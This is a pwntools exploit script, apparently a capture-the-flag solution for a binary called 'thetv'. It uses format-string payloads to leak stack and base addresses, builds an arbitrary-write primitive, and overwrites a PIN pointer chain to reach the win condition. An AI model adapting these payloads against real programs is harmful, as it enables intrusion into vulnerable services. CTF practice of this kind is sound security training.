#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('thetv')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)



gdbscript = '''
init-pwndbg
breakrva 0x1687
b *checkPin
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def arb_write_8(addr, data):
    payload = b''
    
    if data == 0:
        payload = f"%18$hhn".encode()
    else:
        payload = f"%{data}c%18$hhn".encode()
    
    payload = payload.ljust(16, b".")
    payload += p64(addr)

    io.sendlineafter(b"(c)? p/c", b"p")
    io.sendline(payload)

def arb_write_64(addr, data):
    to_write = [
        data & 0xff,
        (data >> 8) & 0xff,
        (data >> 16) & 0xff,
        (data >> 24) & 0xff,
        (data >> 32) & 0xff,
        (data >> 40) & 0xff,
        (data >> 48) & 0xff,
        (data >> 56) & 0xff,
        ]
    
    for i in range(0, len(to_write)):
        arb_write_8(addr+i, to_write[i])

    
def solve():

    # leak values
    io.sendlineafter(b"(c)? p/c", b"p")
    io.sendline(b"%10$p.%31$p") # io.sendline(b"%10$p.%29$p") 
    io.recvuntil(b"You say:")
    leak = io.recvline().split(b".")
    stack_leak = int(leak[0], 16) 
    trial_count = stack_leak - 0x8
    pin_val = stack_leak + 0x10
    exe.address = int(leak[1], 16) - exe.sym["main"]
    pin_addr = exe.sym["pin"]
    info("elf base: %#x", exe.address)
    info("pin comp: %#x", pin_val)
    info("pin addr: %#x", pin_addr)


    # overwrite iterate to a larger value
    io.sendlineafter(b"(c)? p/c", b"p")
    payload = f"%100c%18$n".encode()
    payload = payload.ljust(16, b".")
    payload += p64(trial_count)
    io.sendline(payload)


    # pin_val overwrite
    data_section = exe.address + 0x4000
    leet = 0x1337
    arb_write_64(pin_addr, data_section)
    arb_write_64(data_section, data_section+16)
    arb_write_64(data_section+16, data_section+24)
    arb_write_64(data_section+24, data_section+32)
    arb_write_64(data_section+32, leet)


    # # trigger win
    io.sendlineafter(b"(c)? p/c", b"c")
    io.sendlineafter(b"(y/n)", b"y")
    io.sendlineafter(b"channel?", b"6")
    io.sendline(str(leet).encode())

    io.interactive()

    


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
